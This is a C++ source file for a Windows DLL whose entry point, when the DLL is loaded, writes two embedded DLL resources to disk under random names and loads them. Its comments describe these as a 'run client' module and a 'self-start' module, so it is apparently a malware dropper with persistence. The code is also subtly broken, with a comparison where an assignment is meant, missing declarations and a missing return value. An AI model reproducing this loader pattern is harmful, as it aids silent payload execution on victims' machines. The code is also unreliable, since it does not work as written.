// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "resource.h"
#include <Windows.h>
#include <shlobj.h>
#pragma comment(lib, "shell32.lib")
#include <iostream>
using namespace std;

bool isRun = false;

HMODULE ModuleHandle;
extern "C" _declspec(dllexport) void __cdecl loader()
{
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		ModuleHandle = hModule;
		if (isRun == false)
			loadStart();
		isRun == true;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
	
    return TRUE;
}

void loadStart()
{
	char releasedRunDll[MAX_PATH] = "x6BQIpoQLNoQE69g.dll";
	char releasedSelfStartDll[MAX_PATH] = "67oxHx5vfqvFlxFs.dll";
	char runClinetDll[MAX_PATH] = "x6BQIpoQLNoQE69g.dll";
	char selfStartingDll[MAX_PATH] = "67oxHx5vfqvFlxFs.dll";

	releaseDll(releasedRunDll, MAKEINTRESOURCE(IDR_RUNCLIENTDLL1), L"RunClientDll");            // 释放 DLL 资源
	releaseDll(releasedSelfStartDll, MAKEINTRESOURCE(IDR_SELFSTARTDLL1), L"SelfStartDll");

	runClient(runClinetDll);                                                   // 执行 DLL 资源
	selfStarting(selfStartingDll);
}

// 释放资源
bool releaseDll(char *filePath, LPCWSTR type, LPCWSTR ResName)
{
	// 获取资源
	HRSRC id = ::FindResource(ModuleHandle, type, ResName);
	if (id == NULL)
		return false;

	// 获取资源大小
	DWORD size = ::SizeofResource(ModuleHandle, id);

	// 加载资源
	HGLOBAL hResData = ::LoadResource(ModuleHandle, id);
	if (hResData == NULL)
		return false;

	HANDLE hHeap, hAlloc;
	hHeap = ::HeapCreate(NULL , size, NULL);
	if (!hHeap)
		return false;

	hAlloc = ::HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
	if (!hAlloc)
		return false;

	// 锁定资源
	memcpy(hAlloc, LockResource(hResData), size);
	HANDLE hFile = ::CreateFileA(filePath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
	DWORD written;

	// 释放资源
	::WriteFile(hFile, hAlloc, size, &written, NULL);
	::CloseHandle(hFile);
}

// 运行功能模块
void runClient(char *DllModule)
{
	LoadLibraryA(DllModule);
}

// 实现自启动
void selfStarting(char *DllModule)
{
	LoadLibraryA(DllModule);
}
